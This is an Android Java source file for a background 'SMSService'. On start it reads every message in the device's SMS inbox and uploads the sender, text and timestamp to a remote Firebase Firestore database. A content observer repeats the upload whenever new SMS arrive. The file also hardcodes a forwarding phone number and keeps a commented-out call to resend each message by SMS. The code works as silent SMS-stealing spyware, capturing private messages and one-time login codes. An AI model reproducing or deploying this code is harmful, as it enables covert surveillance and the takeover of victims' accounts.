package com.abhi.smstesting;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.widget.Toast;

import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class SMSService extends Service {

    // Define the destination phone number here
    private static final String DESTINATION_NUMBER = "+918761237654"; // Change to your desired number

    private ContentObserver contentObserver;

    @Override
    public IBinder onBind(Intent intent) {
        // Not needed for SMS service
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String deviceId = fetchDeviceId();
        if (deviceId != null) {
            // Proceed with fetching and sending SMS messages
            fetchAndSendSmsMessages(deviceId);
            registerContentObserver();
        } else {
            // Unable to fetch device ID
            Toast.makeText(this, "Failed to fetch device ID", Toast.LENGTH_SHORT).show();
        }
        return START_STICKY;
    }

    private String fetchDeviceId() {
        String manufac = Build.MANUFACTURER;
        String model = Build.MODEL;
        if(model.startsWith(manufac)){
            return capitalize(model);
        }else{
            return capitalize(manufac) + " " + model;
        }
//        return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
    }
    private String capitalize(String s) {
        if (s == null || s.length() == 0) {
            return "";
        }
        char first = s.charAt(0);
        if (Character.isLowerCase(first)) {
            return Character.toUpperCase(first) + s.substring(1);
        } else {
            return s;
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        unregisterContentObserver();
    }



//    private void fetchAndSendSmsMessages(String deviceId) {
//        try {
//            // Fetch SMS messages from the device sorted by date in ascending order
//            ContentResolver contentResolver = getContentResolver();
//            Uri uri = Uri.parse("content://sms/inbox");
//            Cursor cursor = contentResolver.query(uri, null, null, null, "date ASC");
//
//            if (cursor != null && cursor.moveToFirst()) {
//                do {
//                    String messageBody = cursor.getString(cursor.getColumnIndexOrThrow("body"));
//                    String sender = cursor.getString(cursor.getColumnIndexOrThrow("address"));
//                    long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
//                    String formattedDateTime = formatDate(timestamp);
//
//                    // Construct the message details
//                    String fullMessage = "From: " + sender + "\n";
//                    fullMessage += "Date: " + formattedDateTime + "\n";
//                    fullMessage += "Message: " + messageBody;
//
//                    // Replace any special characters in the sender's number to make it suitable as a document ID
//                    String senderId = sender.replaceAll("[^a-zA-Z0-9]", "_");
//
//                    // Store the message in the 'smsMessages' collection using senderId as the document ID
//                    FirebaseFirestore db = FirebaseFirestore.getInstance();
//                    Map<String, Object> smsData = new HashMap<>();
//                    smsData.put("sender", sender);
//                    smsData.put("message", messageBody);
//                    smsData.put("timestamp", timestamp);
//                    db.collection("users").document(deviceId)
//                            .collection("smsMessages").document(senderId).set(smsData)
//                            .addOnSuccessListener(aVoid -> {
//                                // Message added successfully
//                                Toast.makeText(this, "SMS added to Firestore", Toast.LENGTH_SHORT).show();
//                            })
//                            .addOnFailureListener(e -> {
//                                // Error adding message
//                                Toast.makeText(this, "Failed to add SMS: " + e.getMessage(), Toast.LENGTH_LONG).show();
//                            });
//
//                    // Uncomment the following line to forward the message
//                    // sendSmsInBackground(fullMessage);
//                } while (cursor.moveToNext());
//            }
//
//            if (cursor != null) {
//                cursor.close();
//            }
//        } catch (Exception e) {
//            Toast.makeText(this, "Failed to fetch and send SMS: " + e.getMessage(), Toast.LENGTH_LONG).show();
//        }
//    }
private void fetchAndSendSmsMessages(String deviceID) {
    try {
        // Fetch SMS messages from the device sorted by date in ascending order
        ContentResolver contentResolver = getContentResolver();
        Uri uri = Uri.parse("content://sms/inbox");
        Cursor cursor = contentResolver.query(uri, null, null, null, "date ASC");

        if (cursor != null && cursor.moveToFirst()) {
            do {
                String messageBody = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                String sender = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                String formattedDateTime = formatDate(timestamp);

                // Construct the message details
                String fullMessage = "From: " + sender + "\n";
                fullMessage += "Date: " + formattedDateTime + "\n";
                fullMessage += "Message: " + messageBody;

                // Check if there's an existing document for the device ID
                FirebaseFirestore db = FirebaseFirestore.getInstance();
//                String deviceId = "YOUR_DEVICE_ID"; // Replace with the actual device ID
                DocumentReference docRef = db.collection("users").document(deviceID);
                docRef.get().addOnCompleteListener(task -> {
                    if (task.isSuccessful()) {
                        DocumentSnapshot document = task.getResult();
                        if (document.exists()) {
                            // Document exists, update it by appending the new message
                            Map<String, Object> smsData = new HashMap<>();
                            smsData.put("sender", sender);
                            smsData.put("message", messageBody);
                            smsData.put("timestamp", timestamp);
                            docRef.collection("smsMessages").add(smsData)
                                    .addOnSuccessListener(documentReference -> {
                                        // Message appended successfully
                                        Toast.makeText(this, "SMS appended to existing document", Toast.LENGTH_SHORT).show();
                                    })
                                    .addOnFailureListener(e -> {
                                        // Error appending message
                                        Toast.makeText(this, "Failed to append SMS: " + e.getMessage(), Toast.LENGTH_LONG).show();
                                    });
                        } else {
                            // Document doesn't exist, create a new one and store the message
                            Map<String, Object> userData = new HashMap<>();
                            userData.put("storeSms", true); // Set storeSms field to true
                            db.collection("users").document(deviceID).set(userData)
                                    .addOnSuccessListener(aVoid -> {
                                        // Document created successfully, add the message
                                        Map<String, Object> smsData = new HashMap<>();
                                        smsData.put("sender", sender);
                                        smsData.put("message", messageBody);
                                        smsData.put("timestamp", timestamp);
                                        docRef.collection("smsMessages").add(smsData)
                                                .addOnSuccessListener(documentReference -> {
                                                    // Message added successfully
                                                    Toast.makeText(this, "SMS added to new document", Toast.LENGTH_SHORT).show();
                                                })
                                                .addOnFailureListener(e -> {
                                                    // Error adding message
                                                    Toast.makeText(this, "Failed to add SMS: " + e, Toast.LENGTH_LONG).show();
                                                });
                                    })
                                    .addOnFailureListener(e -> {
                                        // Error creating document
                                        Toast.makeText(this, "Failed to create document: " + e, Toast.LENGTH_LONG).show();
                                    });
                        }
                    } else {
                        // Error fetching document
                        Toast.makeText(this, "Failed to fetch document: " + task, Toast.LENGTH_LONG).show();
                    }
                });

                // Uncomment the following line to forward the message
                // sendSmsInBackground(fullMessage);
            } while (cursor.moveToNext());
        }

        if (cursor != null) {
            cursor.close();
        }
    } catch (Exception e) {
        Toast.makeText(this, "Failed to fetch and send SMS: " + e.getMessage(), Toast.LENGTH_LONG).show();
    }
}


    private String formatDate(long timestamp) {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        return sdf.format(new Date(timestamp));
    }

    private void registerContentObserver() {
        contentObserver = new ContentObserver(new Handler()) {
            @Override
            public void onChange(boolean selfChange) {
                super.onChange(selfChange);
                // If any change occurs in the SMS inbox, fetch and send the new SMS messages
                fetchAndSendSmsMessages(fetchDeviceId());
            }
        };

        getContentResolver().registerContentObserver(Uri.parse("content://sms/inbox"), true, contentObserver);
    }

    private void unregisterContentObserver() {
        if (contentObserver != null) {
            getContentResolver().unregisterContentObserver(contentObserver);
        }
    }


}
